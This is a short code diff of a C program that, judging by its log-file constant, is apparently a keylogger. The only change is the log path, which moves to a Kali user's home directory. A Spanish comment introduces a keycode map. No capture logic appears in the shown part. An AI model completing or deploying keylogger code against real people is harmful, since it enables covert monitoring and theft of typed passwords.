@@ -7,7 +7,7 @@
 #include <stdlib.h>
 #include <errno.h>
 
-#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"
+#define LOGFILEPATH "/home/kali/keylogger.txt"
 
 // Mapeo básico de códigos de teclas a caracteres (para teclado QWERTY en inglés)
 char keymap[128] = {
